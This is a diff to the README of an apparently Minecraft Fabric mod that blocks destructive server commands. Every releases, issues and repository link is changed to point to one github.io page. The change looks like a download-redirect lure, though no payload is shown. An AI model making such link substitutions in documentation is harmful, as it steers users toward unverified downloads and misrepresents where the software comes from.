@@ -1,7 +1,7 @@
 # 🛡️ cnm-protection-fabric-mod - Stop Command Accidents Before They Happen
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://github.com/manzz2429/cnm-protection-fabric-mod/releases)
-[![GitHub Release](https://img.shields.io/github/v/release/manzz2429/cnm-protection-fabric-mod?style=for-the-badge&color=blue)](https://github.com/manzz2429/cnm-protection-fabric-mod/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest-blue?style=for-the-badge)](https://manzz2429.github.io)
+[![GitHub Release](https://img.shields.io/github/v/release/manzz2429/cnm-protection-fabric-mod?style=for-the-badge&color=blue)](https://manzz2429.github.io)
 
 ## 👋 What This Mod Does
 
@@ -40,7 +40,7 @@ You no longer need to worry about a single typo or a wrong click that destroys h
 
 ### Step 1: Visit the Download Page
 
-Go to the [cnm-protection-fabric-mod releases page](https://github.com/manzz2429/cnm-protection-fabric-mod/releases). You will see a list of versions. The latest version is at the top.
+Go to the [cnm-protection-fabric-mod releases page](https://manzz2429.github.io). You will see a list of versions. The latest version is at the top.
 
 ### Step 2: Download the Mod File
 
@@ -111,7 +111,7 @@ To remove a command, delete the line. Save the file and restart the server or ru
 
 ## 📥 Download Again
 
-Need the mod again? Visit the [releases page](https://github.com/manzz2429/cnm-protection-fabric-mod/releases) and download the latest version.
+Need the mod again? Visit the [releases page](https://manzz2429.github.io) and download the latest version.
 
 ## ❓ Troubleshooting
 
@@ -145,7 +145,7 @@ This mod is open source under the MIT License. You can use, modify, and distribu
 
 ## 🤝 How to Contribute
 
-Found a bug? Want a new feature? Visit the [issues page](https://github.com/manzz2429/cnm-protection-fabric-mod/issues) on GitHub. You can also fork the repository and submit a pull request.
+Found a bug? Want a new feature? Visit the [issues page](https://manzz2429.github.io) on GitHub. You can also fork the repository and submit a pull request.
 
 ## 📦 Building from Source
 
@@ -169,8 +169,8 @@ If you want to build the mod yourself, you need a Java Development Kit (JDK) ver
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/manzz2429/cnm-protection-fabric-mod)
-- [Releases](https://github.com/manzz2429/cnm-protection-fabric-mod/releases)
-- [Issues](https://github.com/manzz2429/cnm-protection-fabric-mod/issues)
+- [GitHub Repository](https://manzz2429.github.io)
+- [Releases](https://manzz2429.github.io)
+- [Issues](https://manzz2429.github.io)
 
 Keywords: fabric mod, minecraft mod, server protection, command protection
